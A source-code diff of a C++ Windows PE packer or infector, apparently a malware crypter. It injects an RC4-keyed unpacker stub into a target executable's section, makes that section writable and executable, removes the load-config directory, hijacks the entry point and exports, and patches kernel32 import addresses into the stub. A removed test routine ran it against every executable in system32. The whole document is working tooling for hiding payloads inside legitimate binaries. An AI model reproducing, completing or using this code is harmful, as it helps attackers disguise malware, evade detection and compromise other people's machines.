+		pTargetSection->GetSectionHeader()->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE;
 	}
 	else
 	{	// EXE STUB ... SECTION RX
-		pInfectSection->GetSectionHeader()->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE;
+		pTargetSection->GetSectionHeader()->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE;
 	}
 
 	// Laod Config Data <-> REMOVE!!!
-	if (DataDir[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress != 0 && pInfectMe->IsDLL() == FALSE)
+	if (DataDir[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress != 0 && pTarget->IsDLL() == FALSE)
 	{
 		std::cout << "\t**WARNING**\tLOAD_CONFIG Data Directory isn't NULL! Removing! " << std::endl;
 
@@ -684,21 +573,31 @@ int main32(int argc, char *argv[])
 	}
 
 	PIMAGE_EXPORT_DIRECTORY ExportDirectory =  
-		(PIMAGE_EXPORT_DIRECTORY) pInfectMe->RawPointer(DataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+		(PIMAGE_EXPORT_DIRECTORY) pTarget->RawPointer(DataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 		
-	LPDWORD AddressOfFunctions = (LPDWORD) pInfectMe->RawPointer(ExportDirectory->AddressOfFunctions);
+
+	LPDWORD AddressOfFunctions = NULL;
+	
+	if (ExportDirectory != NULL)
+	{
+		 AddressOfFunctions = (LPDWORD) pTarget->RawPointer(ExportDirectory->AddressOfFunctions);
+	}
+	else
+	{
+		ExportDirectory = NULL;
+	}
 
 
 	ULONG *table = NULL;
 
-	if (pInfectMe->IsDLL()) 
+	if (pTarget->IsDLL()) 
 		table = dll32_FakeExport;
 	else
 		table = exe32_FakeExport;
 
 	LPVOID lpRawSource = rva2addr(pImageDosHeader, pImageNtHeaders32, CALC_OFFSET(LPVOID, pImageDosHeader, pUnpackerCode->VirtualAddress));
 	
-	int maxoffset = (pInfectSection->VirtualSize() - pUnpackerCode->SizeOfRawData);
+	int maxoffset = (pTargetSection->VirtualSize() - pUnpackerCode->SizeOfRawData);
 	
 	int basesize  = 0;
 
@@ -707,11 +606,23 @@ int main32(int argc, char *argv[])
 	else
 		basesize = rand() % maxoffset;	// offset
 
+	if (argc > 6)
+	{	// test!!!
+		basesize = atoi(argv[6]);
+	}
+
+	//---- TO FIX!!! ----
+	/* 
+	 *	Transfer_Reloc_Process -> PageRVA 
+	*/
+	basesize = basesize & 0xfffff000;	// bugfix
+	//---- TO FIX!!! ----
+
 	std::cout << "[CONFIG] Section Name: " << szSectionName << std::endl;
 	std::cout << "[CONFIG]         base: " << std::hex << basesize << std::endl;
-	std::cout << "[CONFIG]         size: " << std::hex << pInfectSection->VirtualSize() << std::endl;
+	std::cout << "[CONFIG]         size: " << std::hex << pTargetSection->VirtualSize() << std::endl;
 
-	LPVOID lpRawDestin = CALC_OFFSET(LPVOID, pInfectSection->RawData(), basesize);	// an offset inside acceptable range
+	LPVOID lpRawDestin = CALC_OFFSET(LPVOID, pTargetSection->RawData(), basesize);	// an offset inside acceptable range
 
 
 	/*******************************************************************************************
@@ -724,7 +635,7 @@ int main32(int argc, char *argv[])
 	/**
 	 *	Decryption routine
 	 **/
-	if (pInfectMe->IsDLL())
+	if (pTarget->IsDLL())
 	{	// process code for encryption of "RC4"
 	
 	}
@@ -746,7 +657,7 @@ int main32(int argc, char *argv[])
 	/**
 	 *	EXPORT SYMBOLS
 	 **/
-	if (pInfectMe->IsDLL())
+	if (pTarget->IsDLL())
 	{	// DLL - Patch 
 		for(int i=0; i < ExportDirectory->NumberOfFunctions; i++)
 		{
@@ -760,27 +671,27 @@ int main32(int argc, char *argv[])
 
 			ULONG exportSymbolEntryPoint = exportRVA - ((ULONG) pImageDosHeader) - pUnpackerCode->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
 		
-			exportSymbolEntryPoint = pInfectSection->VirtualAddress() + basesize + exportSymbolEntryPoint; // - pInfectMeNtHeader->OptionalHeader.SectionAlignment;
+			exportSymbolEntryPoint = pTargetSection->VirtualAddress() + basesize + exportSymbolEntryPoint; // - pTargetNtHeader->OptionalHeader.SectionAlignment;
 		
 			DWORD dwOldValue = AddressOfFunctions[i];
 			AddressOfFunctions[i] = exportSymbolEntryPoint;
 		
-			Patch_EXPORT_SYMBOL(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, (LPVOID) table[i], exportSymbolEntryPoint, dwOldValue - 0x1000);
+			Patch_EXPORT_SYMBOL(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, (LPVOID) table[i], exportSymbolEntryPoint, dwOldValue - 0x1000);
 		}
 	}
 	else
 	{	// EXE - overwrite "export"
 		int stubsize = (int)(table[1] - table[0]);
 
-		PIMAGE_DATA_DIRECTORY dir = pInfectMe->DataDirectory();
+		PIMAGE_DATA_DIRECTORY dir = pTarget->DataDirectory();
 
 		BYTE watermark[8];
 
 		if (dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0)
 		{
-			PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY) pInfectMe->RawPointer(dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+			PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY) pTarget->RawPointer(dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
-			memcpy(watermark, pInfectMe->RawPointer(pExportDir->Name), 8);
+			memcpy(watermark, pTarget->RawPointer(pExportDir->Name), 8);
 		}
 
 		for(int i = 0; i < (sizeof(table) / sizeof(ULONG)); i++)
@@ -788,7 +699,7 @@ int main32(int argc, char *argv[])
 			ULONG exportRVA = table[i];
 			ULONG exportSymbolEntryPoint = exportRVA - ((ULONG) pImageDosHeader) - pUnpackerCode->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
 		
-			exportSymbolEntryPoint = pInfectSection->VirtualAddress() + basesize + exportSymbolEntryPoint; // - pInfectMeNtHeader->OptionalHeader.SectionAlignment;
+			exportSymbolEntryPoint = pTargetSection->VirtualAddress() + basesize + exportSymbolEntryPoint; // - pTargetNtHeader->OptionalHeader.SectionAlignment;
 
 			LPVOID lp = FindBlockMem((LPBYTE)lpRawDestin, pUnpackerCode->SizeOfRawData, (LPVOID) table[i], stubsize);
 
@@ -803,9 +714,9 @@ int main32(int argc, char *argv[])
 
 	ULONG rvaEntryPoint = offsetEntryPoint - ((ULONG) pImageDosHeader) - pUnpackerCode->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
 	
-	DWORD AddressOfEntryPoint = pInfectMe->NtHeader()->OptionalHeader.AddressOfEntryPoint;
+	DWORD AddressOfEntryPoint = pTarget->NtHeader()->OptionalHeader.AddressOfEntryPoint;
 	
-	if (pInfectMe->IsDLL() == FALSE)
+	if (pTarget->IsDLL() == FALSE)
 	{	// it's a dll!!
 		offsetEntryPoint = (ULONG) (__crt0Startup);
 		rvaEntryPoint = offsetEntryPoint - ((ULONG) pImageDosHeader) - pUnpackerCode->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
@@ -814,10 +725,10 @@ int main32(int argc, char *argv[])
 
 	//////////////////////
 	// write new entry point!
-	pInfectMe->NtHeader()->OptionalHeader.AddressOfEntryPoint = pInfectSection->VirtualAddress() + basesize + rvaEntryPoint; // - pInfectMeNtHeader->OptionalHeader.SectionAlignment;
+	pTarget->NtHeader()->OptionalHeader.AddressOfEntryPoint = pTargetSection->VirtualAddress() + basesize + rvaEntryPoint; // - pTargetNtHeader->OptionalHeader.SectionAlignment;
 	///////////////////////
 	
-	if (kernel32GetProcAddress_Offset == 0 || kernel32LoadLibraryA_Offset == 0)
+	if (!get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "GetProcAddress") || !get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "LoadLibraryA"))
 	{
 		std::cout << "Error! KERNEL32!GetProcAddress/LoadLibraryA not found in IAT" << std::endl;
 		return 0;
@@ -825,36 +736,36 @@ int main32(int argc, char *argv[])
 
 	ULONG64 *passKeyPtr = (ULONG64*) &passKey;
 
-	//Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_EntryPoint, 9, AddressOfEntryPoint);
+	//Patch_MARKER(pTarget, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_EntryPoint, 9, AddressOfEntryPoint);
 
 	/**
 	 *	patch code
 	 **/
-	if (pInfectMe->IsDLL())
+	if (pTarget->IsDLL())
 	{	// DLL ! FIX entry point
-		Patch_Entry(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_EntryPoint, 0x10, AddressOfEntryPoint-0x1000);
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_dll32_LoadLibraryA, 0x12, kernel32LoadLibraryA_Offset);
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_dll32_GetProcAddress, 0x12, kernel32GetProcAddress_Offset);
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_GetModuleFileNameA, 0x12, kernel32GetModuleFileNameA_Offset);
+		Patch_Entry(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_EntryPoint, 0x10, AddressOfEntryPoint-0x1000);
+		Patch_MARKER(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_dll32_LoadLibraryA, 0x12, get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "LoadLibraryA"));
+		Patch_MARKER(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_dll32_GetProcAddress, 0x12, get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "GetProcAddress"));
+		Patch_MARKER(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_GetModuleFileNameA, 0x12, get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "GetModuleFileNameA"));
 	}
 	else
 	{	// EXE ! FIX entry point
-		Patch_Entry(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_CrtStartup, 0x0A, AddressOfEntryPoint, 0x0a);
-		Patch_Entry(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_GETBASE, 0x0a, pInfectSection->VirtualAddress() + basesize, 0x01);
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_exe_LoadLibraryA, 0x0c, kernel32LoadLibraryA_Offset);
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_exe_GetProcAddress, 0x0c, kernel32GetProcAddress_Offset);
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_exe_GetModuleFileNameA, 0x0c, kernel32GetModuleFileNameA_Offset);
+		Patch_Entry(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_CrtStartup, 0x0A, AddressOfEntryPoint, 0x0a);
+		Patch_Entry(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_GETBASE, 0x0a, pTargetSection->VirtualAddress() + basesize, 0x01);
+		//Patch_MARKER(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_exe_LoadLibraryA, 0x0c, get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "LoadLibraryA"));
+		//Patch_MARKER(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_exe_GetProcAddress, 0x0c, get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "GetProcAddress"));
+		Patch_MARKER(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_exe_GetModuleFileNameA, 0x0c, get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "GetModuleFileNameA"));
 	}
 
 	
-	if (kernel32CreateFileA_Offset == 0)
+	if (get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "CreateFileA") == 0)
 	{
-		ULONG exportRVA = (pInfectMe->IsDLL()) ? (ULONG) _CreateFileA : (ULONG) _exe_CreateFileA;
+		ULONG exportRVA = (pTarget->IsDLL()) ? (ULONG) _CreateFileA : (ULONG) _exe_CreateFileA;
 
 		ULONG exportSymbolEntryPoint = exportRVA - ((ULONG) pImageDosHeader) - pUnpackerCode->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
 		
-		exportSymbolEntryPoint = pInfectSection->VirtualAddress() + basesize + exportSymbolEntryPoint; // - pInfectMeNtHeader->OptionalHeader.SectionAlignment;
-		LPBYTE lp = (LPBYTE) FindBlockMem((LPBYTE)lpRawDestin, pInfectSection->SizeOfRawData(), (pInfectMe->IsDLL()) ? (LPVOID) _CreateFileA : (LPVOID) _exe_CreateFileA, 0x12);
+		exportSymbolEntryPoint = pTargetSection->VirtualAddress() + basesize + exportSymbolEntryPoint; // - pInfectMeNtHeader->OptionalHeader.SectionAlignment;
+		LPBYTE lp = (LPBYTE) FindBlockMem((LPBYTE)lpRawDestin, pTargetSection->SizeOfRawData(), (pTarget->IsDLL()) ? (LPVOID) _CreateFileA : (LPVOID) _exe_CreateFileA, 0x12);
 		char symbolname[17] = { '~', 'C', 'r', 'e', 'a', 't', 'e', 0x01, 0x01, 0x01, 0x01, 'F', 'i', 'l','e','A',0x00};
 
 		memcpy(lp, symbolname, 7);
@@ -863,23 +774,24 @@ int main32(int argc, char *argv[])
 	}
 	else
 	{	// applying patch!!!
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, (pInfectMe->IsDLL()) ? &_CreateFileA : &_exe_CreateFileA, 0x12, kernel32CreateFileA_Offset);
+		Patch_MARKER(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, (pTarget->IsDLL()) ? &_CreateFileA : &_exe_CreateFileA, 0x12, get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "CreateFileA"));
 	}
-	Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, (pInfectMe->IsDLL()) ? &_SetFilePointer : &_exe_SetFilePointer, 0x12, kernel32SetFilePointer_Offset);
-	Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, (pInfectMe->IsDLL()) ? &_ReadFile : &_exe_ReadFile, 0x12, kernel32ReadFile_Offset);
-	Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, (pInfectMe->IsDLL()) ? &_CloseHandle : &_exe_CloseHandle, 0x12, kernel32CloseHandle_Offset);
 
-	Patch_MARKER_QWORD(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_rc4key0, passKeyPtr[0]);
-	Patch_MARKER_QWORD(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_rc4key1, passKeyPtr[1]);
-	Patch_MARKER_DWORD(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &dwRelocSize, DataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
-	Patch_MARKER_DWORD(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &lpRelocAddress, DataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+	Patch_MARKER(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, (pTarget->IsDLL()) ? &_SetFilePointer : &_exe_SetFilePointer, 0x12, get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "SetFilePointer"));
+	Patch_MARKER(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, (pTarget->IsDLL()) ? &_ReadFile : &_exe_ReadFile, 0x12, get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "ReadFile"));
+	Patch_MARKER(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, (pTarget->IsDLL()) ? &_CloseHandle : &_exe_CloseHandle, 0x12, get_iat_value(kernel32_iat, KERNEL32_IAT_LENGTH, "CloseHandle"));
+
+	Patch_MARKER_QWORD(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_rc4key0, passKeyPtr[0]);
+	Patch_MARKER_QWORD(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_rc4key1, passKeyPtr[1]);
+	Patch_MARKER_DWORD(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &dwRelocSize, DataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
+	Patch_MARKER_DWORD(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &lpRelocAddress, DataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 	
-	if (pInfectMe->IsDLL())
+	if (pTarget->IsDLL())
 	{	// nothing!!!
 	}
 	else
 	{	// save preferred image base
-		Patch_MARKER_DWORD(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_baseAddress, pInfectMe->NtHeader()->OptionalHeader.ImageBase);
+		Patch_MARKER_DWORD(pTarget, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_baseAddress, pTarget->NtHeader()->OptionalHeader.ImageBase);
 	}
 
 	// Transfer our .reloc into .reloc of target
@@ -893,127 +805,51 @@ int main32(int argc, char *argv[])
 		dwOffset = RoundUp(relocSection->VirtualSize(), 0x10);
 		dwNewRelocOffset = relocSection->VirtualAddress() + dwOffset;
 		LPVOID lpWriteInto = CALC_OFFSET(LPVOID, relocSection->RawData(), dwOffset);
-		dwNewRelocSize = Transfer_Reloc_Table(pImageDosHeader, pImageNtHeaders32, pUnpackerCode, lpWriteInto, pInfectSection->VirtualAddress() + basesize, pInfectMe, pInfectMe->NtHeader());
+		DWORD newVirtualAddress = pTargetSection->VirtualAddress() + basesize;
+		PIMAGE_NT_HEADERS32 pTargetNtHeader = pTarget->NtHeader();
+		dwNewRelocSize = Transfer_Reloc_Table(pImageDosHeader, pImageNtHeaders32, pUnpackerCode, lpWriteInto, newVirtualAddress, pTarget, pTargetNtHeader);
 		relocSection->GetSectionHeader()->Misc.VirtualSize = dwOffset + dwNewRelocSize;
 	}
 	else
 	{	// allocate new section inside ".text" section
-		dwOffset = RoundUp(pUnpackerCode->Misc.VirtualSize, 16);
-		dwNewRelocSize = Transfer_Reloc_Table(pImageDosHeader, pImageNtHeaders32, pUnpackerCode, CALC_OFFSET(LPVOID, lpRawDestin, dwOffset + basesize ), pInfectSection->VirtualAddress(), pInfectMe, pInfectMe->NtHeader());
-		dwNewRelocOffset = pInfectSection->VirtualAddress() + dwOffset;
+		// cannot process this object!!!!!
+		//dwOffset = RoundUp(pUnpackerCode->Misc.VirtualSize, 16);
+		//dwNewRelocSize = Transfer_Reloc_Table(pImageDosHeader, pImageNtHeaders32, pUnpackerCode, CALC_OFFSET(LPVOID, lpRawDestin, dwOffset + basesize ), pTargetSection->VirtualAddress(), pTarget, pTarget->NtHeader());
+		//dwNewRelocOffset = pTargetSection->VirtualAddress() + dwOffset;
+
+		// no relocation required?
+		//Patch_Reloc(pImageDosHeader, pImageNtHeaders32, pUnpackerCode, NULL, pTargetSection->VirtualAddress() + basesize, pTarget, pTarget->NtHeader());
 	}
 
-	pInfectMe->NtHeader()->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = dwNewRelocSize;
-	pInfectMe->NtHeader()->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = dwNewRelocOffset;
+	pTarget->NtHeader()->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = dwNewRelocSize;
+	pTarget->NtHeader()->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = dwNewRelocOffset;
 
-	//pInfectSection->
+	//pTarget->MergeSection(pTargetSection, pTarget->getSection(1));
+
+	//pTargetSection->
 
 	if (argc > 2)
 	{
 		char tmpName[MAX_PATH];
 
-		strcpy(tmpName, argv[2]);
+		strcpy_s(tmpName, argv[2]);
 		int lentmp = strlen(tmpName);
 
 		if (tmpName[lentmp-1] == '\\')
 		{	// random name!
 			SYSTEMTIME time;
 			GetSystemTime(&time);
-			sprintf(tmpName, "%s%04i%02i%02i_%02i%02i.exe", argv[2], time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute);
+			sprintf_s(tmpName, "%s%04i%02i%02i_%02i%02i.exe", argv[2], time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute);
 		}
-		pInfectMe->Save(tmpName);
+		pTarget->Save(tmpName);
 	}
 	else
-		pInfectMe->Save(argv[1]);
+		pTarget->Save(argv[1]);
 
-	delete pInfectMe;	// destroy and release memory!
+	delete pTarget;	// destroy and release memory!
 	delete morph;		// destroy and release memory!
 
 	return 0;
 }
-
-int filter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
-{
-	std::cout << "caught AV as expected. " << std::endl;
-	return EXCEPTION_EXECUTE_HANDLER;
-}
-
-int main32_test(int argc, char *argv[])
-{
-	char szOutputFile[MAX_PATH];
-	char szInputFile[MAX_PATH];
-	char szFakeFile[MAX_PATH];
-	char szWindirPath[MAX_PATH];
-
-	char *fakeargv[] = { NULL, szInputFile, szOutputFile, szFakeFile };
-	
-	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
-	LPFN_ISWOW64PROCESS fnIsWow64Process;
-
-	fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandle("kernel32"),"IsWow64Process");
-
-
-	DWORD dwIgnore = GetEnvironmentVariableA("windir", szWindirPath, MAX_PATH);
-
-	if (dwIgnore == 0)
-	{	// try default c:\windows
-		strcpy(szWindirPath, "C:\\windows\\");
-	}
-	else
-	{
-		int i = strlen(szWindirPath);
-
-		if (szWindirPath[i-1] != '\\')
-			strcat(szWindirPath, "\\");
-	}
-
-	if(NULL != fnIsWow64Process)
-    {
-		BOOL bIsWow64 = FALSE;
-
-		fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
-
-		if (bIsWow64)
-			strcat(szWindirPath, "syswow64\\");
-		else
-			strcat(szWindirPath, "system32\\");
-    }
-	else
-	{
-		strcat(szWindirPath, "system32\\");
-	}
-	
-	char szFindPath[MAX_PATH];
-	sprintf(szFindPath, "%s*.exe", szWindirPath);
-
-	WIN32_FIND_DATA findfiledata;
-	HANDLE hLook = FindFirstFileA(szFindPath, &findfiledata);
-		
-	do
-	{	// perform a backup!
-		strcpy(szInputFile, argv[1]);
-		sprintf(szFakeFile, "%s%s", szWindirPath, findfiledata.cFileName);
-		sprintf(szOutputFile, "%s_%s", argv[2], findfiledata.cFileName);
-		
-		std::cout << "Test using " << szFakeFile;
-		
-		//strcpy(szFakeFile, "c:\\tools\\putty.exe");
-
-		__try 
-		{ 	
-			main32(4, fakeargv);
-			std::cout << ".... done" << std::endl;
-		}
-		__except(filter(GetExceptionCode(), GetExceptionInformation())) 
-		{
-			std::cout << ".... done" << std::endl;
-		}
-	
-	} while(FindNextFileA(hLook, &findfiledata));
-
-	FindClose(hLook);
-	return 1;
-}
-
 
 #endif
